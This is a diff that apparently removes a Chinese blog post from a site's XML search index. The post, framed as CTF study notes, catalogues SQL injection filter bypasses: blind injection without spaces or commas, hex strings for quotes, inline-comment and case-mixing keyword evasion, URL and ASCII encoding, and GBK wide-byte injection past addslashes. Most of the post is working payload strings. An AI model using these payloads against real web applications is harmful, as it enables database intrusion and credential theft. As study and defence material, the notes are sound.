@@ -1886,95 +2036,6 @@ post数据<code>name = a' union select 1,2,3 -- +</code></p>
 <a href="https://imgchr.com/i/sA0VcF"><img src="https://s3.ax1x.com/2021/01/05/sA0VcF.png" alt="sA0VcF.png"></a><br>
 看图<br>
 <a href="https://imgchr.com/i/sA0u7R"><img src="https://s3.ax1x.com/2021/01/05/sA0u7R.png" alt="sA0u7R.png"></a></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>sql注入</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>sql注入常见注释及绕过</title>
-    <url>/2020/11/13/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E6%B3%A8%E9%87%8A%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<p>针对一些ctf题目中的过滤</p>
-<a id="more"></a>
-<h3 id="一、绕过空格（注释符-，-a0）"><a class="header-anchor" href="#一、绕过空格（注释符-，-a0）">¶</a>一、绕过空格（注释符/* */，%a0）</h3>
-<p>1.两个空格代替一个空格（双写）</p>
-<p>2.<code>%a0</code>=空格</p>
-<p>3.最基本的绕过方法，用注释替换空格：<code>/*注释/*</code></p>
-<p>4.括号绕过空格</p>
-<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
-<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
-<p>例如：time based盲注：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</span><br></pre></td></tr></table></figure>
-<p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p>
-<h3 id="二、引号绕过（使用十六进制）"><a class="header-anchor" href="#二、引号绕过（使用十六进制）">¶</a>二、引号绕过（使用十六进制）</h3>
-<p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p>
-<p><strong>几乎没有任何注入能过滤十六进制。</strong></p>
-<h3 id="三、逗号绕过（使用from或者offset）"><a class="header-anchor" href="#三、逗号绕过（使用from或者offset）">¶</a>三、逗号绕过（使用from或者offset）</h3>
-<p>在使用盲注的时候，需要使用到<code>substr()</code>,<code>mid()</code>,<code>limit</code>。这些子句方法都需要使用到逗号。</p>
-<p>例如：</p>
-<p>使用from to：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-<p>使用join：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure>
-<p>使用like：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span> #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>使用offset来绕过limit中的&quot;，&quot;：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
-<h3 id="四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）"><a class="header-anchor" href="#四、比较符号（-）绕过（过滤了-：sqlmap盲注经常使用-，使用between的脚本）">¶</a>四、比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h3>
-<p>盲注的时候如果无法使用比较操作符，可使用<code>greatest()</code>、<code>least()</code>。（前者返回最大值，后者返回最小值）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure>
-<p>使用between and：</p>
-<p>between a and b：返回a，b之间的数据，不包含b。</p>
-<h3 id="五、or-and-xor-not绕过"><a class="header-anchor" href="#五、or-and-xor-not绕过">¶</a>五、or and xor not绕过</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and&#x3D;&amp;&amp; ， or&#x3D;|| ， xor&#x3D;| ， not&#x3D;!</span><br></pre></td></tr></table></figure>
-<h3 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a class="header-anchor" href="#六、绕过注释符号（-，–-后面跟一个空格））过滤">¶</a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>最后的or '1闭合查询语句的最后的单引号，或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>
-<h3 id="七、-绕过"><a class="header-anchor" href="#七、-绕过">¶</a>七、= 绕过</h3>
-<p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p>
-<h3 id="八、绕过union，select，where等"><a class="header-anchor" href="#八、绕过union，select，where等">¶</a>八、绕过union，select，where等</h3>
-<p>1.使用注释符绕过：</p>
-<p>常用注释符：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ; , %00 , --a</span><br></pre></td></tr></table></figure>
-<p>用法：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>，pwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure>
-<p>2.使用大小写绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
-<p>3.内联注释绕过：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure>
-<ol start="4">
-<li>双关键字绕过（若删除掉第一个匹配的union就能绕过）：</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3--</span></span><br></pre></td></tr></table></figure>
-<p>5.使用URLencode，ascii编码，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">53</span><span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">4</span>c<span class="operator">%</span><span class="number">45</span><span class="operator">%</span><span class="number">43</span><span class="operator">%</span><span class="number">54</span>(ascii)</span><br></pre></td></tr></table></figure>
-<p>6.函数或特殊符号</p>
-<p>例如：表示admin，oracle中可以用 <code>'adm'||'in'</code> ,  mysql中可以用 <code>concat('adm','in')</code>; mssql中可以用：<code>'adm'+'in'</code></p>
-<h3 id="九、通用绕过（编码）"><a class="header-anchor" href="#九、通用绕过（编码）">¶</a>九、通用绕过（编码）</h3>
-<p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
-<p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p>
-<p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<h3 id="十、等价函数绕过（不同数据库）"><a class="header-anchor" href="#十、等价函数绕过（不同数据库）">¶</a>十、等价函数绕过（不同数据库）</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br></pre></td></tr></table></figure>
-<p>例如：substring()和substr()无法使用时：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span></span><br></pre></td></tr></table></figure>
-<p>或者：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
-<h3 id="十一-宽字节注入"><a class="header-anchor" href="#十一-宽字节注入">¶</a>十一.宽字节注入</h3>
-<p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p>
-<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
-<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
-<p>id=-1%df%27union select 1,user(),3–+</p>
-<p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
-<p>一般产生宽字节注入的PHP函数：</p>
-<p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \  转为 \，将 &quot; 转为 &quot; 。用思路一。</p>
-<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , &quot; , \ 。用思路一</p>
-<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
-<p>3.mysql_real_escape_string()：转义下列字符：</p>
-<p>\x00 \n \r \ ’ &quot; \x1a</p>
-<p>（防御，将mysql设置为gbk即可）</p>
 ]]></content>
       <categories>
         <category>web技术学习</category>
